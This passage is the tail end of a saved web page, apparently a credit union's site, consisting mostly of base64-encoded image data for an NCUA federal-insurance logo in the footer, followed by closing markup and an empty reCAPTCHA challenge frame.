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>
 <img id=ncua-logo class=ncua-logo title="Your savings federally insured to at least $250,000 and backed by the full faith and credit of the United States Government. National Credit Union Administration, a U.S. Government Agency." alt="Your savings federally insured to at least $250,000 and backed by the full faith and credit of the United States Government. NCUA. National Credit Union Administration, a U.S. Government Agency." src="data:image/png;base64,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">
 </div>
 </div>
 </li>
 </ul>
 </div>
 </div>
</footer>
 
<div style=display:none></div><div style="background-color:rgb(255,255,255);border:1px solid rgb(204,204,204);box-shadow:rgba(0,0,0,0.2) 2px 2px 3px;position:absolute;transition:visibility 0s linear 0.3s,opacity 0.3s linear 0s;opacity:0;visibility:hidden;z-index:2000000000;left:0px;top:-10000px"><div style=width:100%;height:100%;position:fixed;top:0px;left:0px;z-index:2000000000;background-color:rgb(255,255,255);opacity:0.05></div><div style="border:11px solid transparent;width:0px;height:0px;position:absolute;pointer-events:none;margin-top:-11px;z-index:2000000000" class=g-recaptcha-bubble-arrow></div><div style="border:10px solid transparent;width:0px;height:0px;position:absolute;pointer-events:none;margin-top:-10px;z-index:2000000000" class=g-recaptcha-bubble-arrow></div><div style=z-index:2000000000;position:relative><iframe title="recaptcha challenge" style=width:100%;height:100% name=c-we6jqum0gccu scrolling=no sandbox="allow-popups allow-top-navigation allow-top-navigation-by-user-activation" srcdoc='<!DOCTYPE html> <html dir=ltr lang=en><meta charset=utf-8>
<meta http-equiv=X-UA-Compatible content="IE=edge">
<title>reCAPTCHA</title>
<style>@keyframes spinner-spin{0%{transform:rotateZ(0deg)}10%{transform:rotateZ(135deg)}25%{transform:rotateZ(245deg)}60%{transform:rotateZ(700deg)}75%{transform:rotateZ(810deg)}100%{transform:rotateZ(1080deg)}}@keyframes overlay-spin{0%{opacity:1;transform:rotateZ(45deg)}100%{opacity:1;transform:rotateZ(225deg)}}body{margin:0}</style>
</head>
<body>
<div></div>' frameborder=0></iframe></div></div>